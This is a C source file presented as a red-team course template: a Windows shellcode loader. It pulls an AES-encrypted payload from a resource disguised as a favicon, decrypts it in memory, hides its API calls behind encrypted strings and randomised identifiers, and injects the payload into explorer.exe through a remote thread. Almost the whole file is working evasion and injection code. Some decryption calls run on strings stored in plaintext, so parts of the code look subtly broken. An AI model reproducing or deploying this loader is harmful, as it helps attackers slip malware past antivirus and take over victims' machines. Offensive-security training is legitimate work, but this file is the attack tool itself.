/*

 Red Team Operator course code template
 storing FqhMjgaPIA in .rsrc section
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>

#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <tlhelp32.h>
#include "resources.h"

// Function Declerations for call obfuscation
LPVOID (WINAPI * pVirtualAllocEx)(
HANDLE 	hProcess, 
LPVOID 	lpAddress, 
SIZE_T 	dwSize, 
DWORD  	flAllocationType, 
DWORD  	flProtect
);

BOOL (WINAPI * pWriteProcessMemory)( 
HANDLE 	hProcess, 
LPVOID  lpBaseAddress, 
LPCVOID lpBuffer, 
SIZE_T  nSize, 
SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)( 
HANDLE 				    hProcess, 
LPSECURITY_ATTRIBUTES   lpThreadAttributes, 
SIZE_T 				    dwStackSize, 
LPTHREAD_START_ROUTINE  lpStartAddress, 
LPVOID 					lpParameter, 
DWORD 					dwCreationFlags, 
LPDWORD 				lpThreadId
);

HANDLE (WINAPI * pCreateToolhelp32Snapshot)(
DWORD dwFlags,
DWORD th32ProcessID
);

BOOL (WINAPI * pProcess32First)(
HANDLE           hSnapshot,
LPPROCESSENTRY32 lppe
);

BOOL (WINAPI * pCloseHandle)(
HANDLE hObject
);

BOOL (WINAPI * pProcess32Next)(
  HANDLE           hSnapshot,
  LPPROCESSENTRY32 lppe
);

DWORD (WINAPI * pWaitForSingleObject)(
HANDLE hHandle,
DWORD  dwMilliseconds
);

HRSRC (WINAPI * pFindResourceA)(
HMODULE hModule,
LPCSTR  lpName,
LPCSTR  lpType
);

HGLOBAL (WINAPI * pLoadResource)(
HMODULE hModule,
HRSRC   hResInfo
);

LPVOID (WINAPI * pLockResource)(
HGLOBAL hResData
);

DWORD (WINAPI * pSizeofResource)(
HMODULE hModule,
HRSRC   hResInfo
);

LPVOID (WINAPI * pVirtualAlloc)(
LPVOID lpAddress,
SIZE_T dwSize,
DWORD  flAllocationType,
DWORD  flProtect
);

VOID (WINAPI * pRtlMoveMemory)(
VOID UNALIGNED *Destination,
VOID UNALIGNED *Source,
SIZE_T         Length
);

HANDLE (WINAPI * pOpenProcess)(
DWORD dwDesiredAccess,
BOOL  bInheritHandle,
DWORD dwProcessId
);

// Keys
unsigned char kVirtualAllocEx[] =  { 0xab, 0xa5, 0x13, 0x53, 0xde, 0xdf, 0x69, 0xb0, 0x61, 0xdb, 0x5d, 0x4, 0x50, 0xf1, 0x99, 0x5b };
unsigned char kWriteProcessMemory[] = { 0xc2, 0x59, 0x6f, 0x34, 0x55, 0xe0, 0x1a, 0xfd, 0xa6, 0x6, 0xa, 0x2b, 0x2e, 0x62, 0xe, 0x18 };
unsigned char kCreateRemoteThread[] = { 0x13, 0xa9, 0xce, 0x2b, 0xfa, 0x85, 0x1d, 0xf0, 0xb5, 0x45, 0xee, 0x7d, 0x5e, 0x89, 0xd5, 0x64 };
unsigned char kCreateToolhelp32Snapshot[] = { 0x16, 0xd1, 0xbc, 0xcf, 0x5, 0xc0, 0x2, 0x2e, 0xde, 0x4e, 0x98, 0x1a, 0xd2, 0xf9, 0x36, 0xdf };
unsigned char kKernel32[] = { 0x4b, 0xd3, 0xb1, 0xe7, 0x45, 0xa1, 0x7e, 0xac, 0x45, 0x95, 0x53, 0x95, 0x3c, 0x45, 0x2d, 0x4 };
unsigned char kProcess32First[] = { 0xd5, 0x6f, 0xa1, 0xc4, 0xb3, 0x62, 0xa2, 0x9c, 0x2a, 0x79, 0x41, 0x95, 0xb1, 0x5b, 0x99, 0x17 };
unsigned char kCloseHandle[] = { 0xd7, 0xc5, 0x74, 0xd7, 0x64, 0xf8, 0x3a, 0x3e, 0x4e, 0xaf, 0x10, 0x94, 0xdf, 0x54, 0xe4, 0xcb };
unsigned char kProcess32Next[] = { 0x1a, 0xf3, 0x10, 0xe9, 0xa5, 0x7c, 0x77, 0xa2, 0x3, 0x35, 0x1e, 0x3f, 0xc0, 0x80, 0x6b, 0x7f };
unsigned char kWaitForSingleObject[] = { 0xd7, 0xe5, 0xc, 0x2, 0x54, 0x7f, 0x5d, 0x4b, 0xc8, 0x8c, 0xfd, 0x43, 0x2, 0x25, 0xa3, 0x4a };
unsigned char kFindResourceA [] = { 0x32, 0x76, 0xe2, 0xfa, 0x6, 0xd9, 0x96, 0x2b, 0xf1, 0x3d, 0x48, 0x2b, 0xc7, 0x8d, 0xfb, 0x20 };
unsigned char kLoadResource[] = { 0x94, 0x56, 0xb3, 0xba, 0x44, 0x13, 0x5e, 0x6d, 0xb, 0x79, 0xdd, 0x82, 0x9b, 0xc1, 0x6e, 0x80 };
unsigned char kLockResource[] = { 0x98, 0x16, 0xf3, 0x45, 0xfc, 0xb9, 0xfc, 0x38, 0xf4, 0x57, 0x6a, 0x22, 0xe, 0x69, 0x2d, 0x8f };
unsigned char kSizeofResource[] = { 0x10, 0x92, 0x54, 0x89, 0x51, 0x44, 0xf5, 0x3f, 0xf2, 0x17, 0x87, 0xd8, 0xca, 0xed, 0xdb, 0x84 };
unsigned char kVirtualAlloc[] = { 0x7c, 0xec, 0x35, 0xe3, 0xcb, 0xab, 0xf5, 0x94, 0x94, 0x42, 0xb4, 0x5a, 0x0, 0x5d, 0xcc, 0xd };
unsigned char kRtlMoveMemory[] = { 0xd5, 0xb8, 0x3d, 0xe3, 0x9, 0xf5, 0x22, 0x58, 0xf5, 0x98, 0xcc, 0x17, 0x78, 0xf2, 0xad, 0x9 };
unsigned char kOpenProcess[] = { 0x8b, 0x3e, 0x1f, 0x66, 0x93, 0xd8, 0x72, 0x15, 0xe9, 0x75, 0xa2, 0x54, 0xa7, 0x76, 0xa1, 0xce };
unsigned char kExplorer[] = { 0xf6, 0xf, 0x7a, 0x9f, 0x84, 0x5d, 0x72, 0x54, 0xb3, 0x24, 0x2c, 0xb9, 0x5b, 0x88, 0xf9, 0x26 };
unsigned char kNotep[] = { 0xee, 0xce, 0xca, 0xff, 0xff, 0xa8, 0xf0, 0xac, 0x8e, 0x7b, 0xf7, 0x10, 0x96, 0x6e, 0x20, 0x80 };

// Functions
unsigned char sVirtualAllocEx[] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78, 0x0 };
unsigned char sWriteProcessMemory[] = { 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x0 };
unsigned char sCreateRemoteThread[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x52, 0x65, 0x6d, 0x6f, 0x74, 0x65, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x0 };
unsigned char sCreateToolhelp32Snapshot[] = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74, 0x0 };
unsigned char sProcess32First[] = { 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0x0 };
unsigned char sCloseHandle[] = { 0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0x0 };
unsigned char sProcess32Next[] = { 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x4e, 0x65, 0x78, 0x74, 0x0 };
unsigned char sWaitForSingleObject[] = { 0x57, 0x61, 0x69, 0x74, 0x46, 0x6f, 0x72, 0x53, 0x69, 0x6e, 0x67, 0x6c, 0x65, 0x4f, 0x62, 0x6a, 0x65, 0x63, 0x74, 0x0 };
unsigned char sFindResourceA[] = { 0x46, 0x69, 0x6e, 0x64, 0x52, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x41, 0x0 };
unsigned char sLoadResource[] = { 0x4c, 0x6f, 0x61, 0x64, 0x52, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x0 };
unsigned char sLockResource[] = { 0x4c, 0x6f, 0x63, 0x6b, 0x52, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x0 };
unsigned char sSizeofResource[] = { 0x53, 0x69, 0x7a, 0x65, 0x6f, 0x66, 0x52, 0x65, 0x73, 0x6f, 0x75, 0x72, 0x63, 0x65, 0x0 };
unsigned char sVirtualAlloc[] = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x0 };
unsigned char sRtlMoveMemory[] = { 0x52, 0x74, 0x6c, 0x4d, 0x6f, 0x76, 0x65, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x0 };
unsigned char sOpenProcess[] = { 0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x0 };

// Strings
unsigned char sKernel32[] = { 0x4b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x0 };
unsigned char sExplorer[] = { 0x65, 0x78, 0x70, 0x6c, 0x6f, 0x72, 0x65, 0x72, 0x2e, 0x65, 0x78, 0x65, 0x0 };
unsigned char sNotep[] = { 0x6e, 0x6f, 0x74, 0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x0 };


int AESDecrypt(char * FqhMjgaPIA, unsigned int FqhMjgaPIA_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, FqhMjgaPIA, &FqhMjgaPIA_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}

int GhWWuRMoWf(const char *procname) {

        HANDLE hProcSnap;
        PROCESSENTRY32 pe32;
        int pid = 0; 
        
		AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), kCreateToolhelp32Snapshot, sizeof(kCreateToolhelp32Snapshot));
		AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), kProcess32First, sizeof(kProcess32First));
		AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), kProcess32Next, sizeof(kProcess32Next));
		
		pCreateToolhelp32Snapshot = GetProcAddress(GetModuleHandle(sKernel32), sCreateToolhelp32Snapshot);
		pProcess32First = GetProcAddress(GetModuleHandle(sKernel32), sProcess32First);
		pCloseHandle = GetProcAddress(GetModuleHandle(sKernel32), sCloseHandle);
		pProcess32Next = GetProcAddress(GetModuleHandle(sKernel32), sProcess32Next);
		
        hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
        pe32.dwSize = sizeof(PROCESSENTRY32); 
                
        if (!pProcess32First(hProcSnap, &pe32)) {
                pCloseHandle(hProcSnap);
                return 0;
        }
                
        while (pProcess32Next(hProcSnap, &pe32)) {
                if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
                        pid = pe32.th32ProcessID;
                        break;
                }
        }
                
        pCloseHandle(hProcSnap);
                
        return pid;
}

int UIMolfSTQZ(HANDLE hProc, unsigned char * FqhMjgaPIA, unsigned int FqhMjgaPIA_len) {

        LPVOID pRemoteCode = NULL;
        HANDLE hThread = NULL;
		
		
		AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), kVirtualAllocEx, sizeof(kVirtualAllocEx));
		AESDecrypt((char *) sWriteProcessMemory, sizeof (sWriteProcessMemory), kWriteProcessMemory, sizeof(kWriteProcessMemory));
		AESDecrypt((char *) sCreateRemoteThread, sizeof (sCreateRemoteThread), kCreateRemoteThread, sizeof(kCreateRemoteThread));
		AESDecrypt((char *) sCreateRemoteThread, sizeof (sCreateRemoteThread), kCreateRemoteThread, sizeof(kCreateRemoteThread));
		
		pVirtualAllocEx = GetProcAddress(GetModuleHandle(sKernel32), sVirtualAllocEx);
		pWriteProcessMemory = GetProcAddress(GetModuleHandle(sKernel32), sWriteProcessMemory);
		pCreateRemoteThread = GetProcAddress(GetModuleHandle(sKernel32),sCreateRemoteThread);
		pWaitForSingleObject = GetProcAddress(GetModuleHandle(sKernel32),sWaitForSingleObject);
		
		
        pRemoteCode = pVirtualAllocEx(hProc, NULL, FqhMjgaPIA_len, MEM_COMMIT, PAGE_EXECUTE_READ);
		
        pWriteProcessMemory(hProc, pRemoteCode, (PVOID)FqhMjgaPIA, (SIZE_T)FqhMjgaPIA_len, (SIZE_T *)NULL);
		
        hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
        if (hThread != NULL) {
                pWaitForSingleObject(hThread, 500);
                pCloseHandle(hThread);
                return 0;
        }
        return -1;
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {
   
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;
	HGLOBAL resHandle = NULL;
	HRSRC res;
	
	AESDecrypt((char *) sKernel32, sizeof(sKernel32), kKernel32, sizeof(kKernel32));
	AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), kCloseHandle, sizeof(kCloseHandle));
	AESDecrypt((char *) sFindResourceA, sizeof(sFindResourceA), kFindResourceA, sizeof(kFindResourceA));
	AESDecrypt((char *) sLoadResource, sizeof(sLoadResource), kLoadResource, sizeof(kLoadResource));
	AESDecrypt((char *) sLockResource, sizeof(sLockResource), kLockResource, sizeof(kLockResource));
	AESDecrypt((char *) sSizeofResource, sizeof(sSizeofResource), kSizeofResource, sizeof(kSizeofResource));
	AESDecrypt((char *) sVirtualAlloc, sizeof(sVirtualAlloc), kVirtualAlloc, sizeof(kVirtualAlloc));
	AESDecrypt((char *) sRtlMoveMemory, sizeof(sRtlMoveMemory), kRtlMoveMemory, sizeof(kRtlMoveMemory));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), kOpenProcess, sizeof(kOpenProcess));
	
	pFindResourceA = GetProcAddress(GetModuleHandle(sKernel32), sFindResourceA);
	pLoadResource = GetProcAddress(GetModuleHandle(sKernel32), sLoadResource);
	pLockResource = GetProcAddress(GetModuleHandle(sKernel32), sLockResource);
	pSizeofResource = GetProcAddress(GetModuleHandle(sKernel32), sSizeofResource);
	pVirtualAlloc = GetProcAddress(GetModuleHandle(sKernel32), sVirtualAlloc);
	pRtlMoveMemory = GetProcAddress(GetModuleHandle(sKernel32), sRtlMoveMemory);
	pOpenProcess = GetProcAddress(GetModuleHandle(sKernel32), sOpenProcess);
	
	unsigned char * FqhMjgaPIA;
	unsigned char kFqhMjgaPIA[] = { 0x61, 0xb8, 0x83, 0x5f, 0x7d, 0xe5, 0xce, 0x4e, 0xdb, 0x4b, 0xcf, 0xce, 0x5b, 0xa5, 0x38, 0x1c };
	unsigned int FqhMjgaPIA_len;
	
	int pid = 0;
	HANDLE hProc = NULL;
	
	// Extract FqhMjgaPIA from resources section
	res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
	resHandle = pLoadResource(NULL, res);
	FqhMjgaPIA = (char *) pLockResource(resHandle);
	FqhMjgaPIA_len = pSizeofResource(NULL, res);
	
	// Allocate some memory buffer for FqhMjgaPIA
	exec_mem = pVirtualAlloc(0, FqhMjgaPIA_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	// printf("%-20s : 0x%-016p\n", "FqhMjgaPIA addr", (void *)FqhMjgaPIA);
	// printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	// Copy FqhMjgaPIA to new memory buffer
	pRtlMoveMemory(exec_mem, FqhMjgaPIA, FqhMjgaPIA_len);
	
	// Decrypt (DeXOR) the FqhMjgaPIA
	// XOR((char *) exec_mem, FqhMjgaPIA_len, key, sizeof(key));
	
	// printf("\nFqhMjgaPIA Copied\n");
	// getchar();
	
	// Implement AES Decryption
	AESDecrypt((char *) exec_mem, FqhMjgaPIA_len, kFqhMjgaPIA, sizeof(kFqhMjgaPIA));
	
	// Make the buffer executable
	//rv = VirtualProtect(exec_mem, FqhMjgaPIA_len, PAGE_EXECUTE_READ, &oldprotect);

	// printf("\nDecrypted\n");
	// getchar();

	// Launch the FqhMjgaPIA
	//if ( rv != 0 ) {
	//		th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
	//		WaitForSingleObject(th, -1);
	//}
	
	// UIMolfSTQZion Process Starts Here
	pid = GhWWuRMoWf(sExplorer);
	
	if (pid) {
		// printf("explorer.exe PID = %d\n", pid);
		// getchar();

		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);
		
		if (hProc != NULL) {
			UIMolfSTQZ(hProc, exec_mem, FqhMjgaPIA_len);
			pCloseHandle(hProc);
		}
	}

	return 0;
}
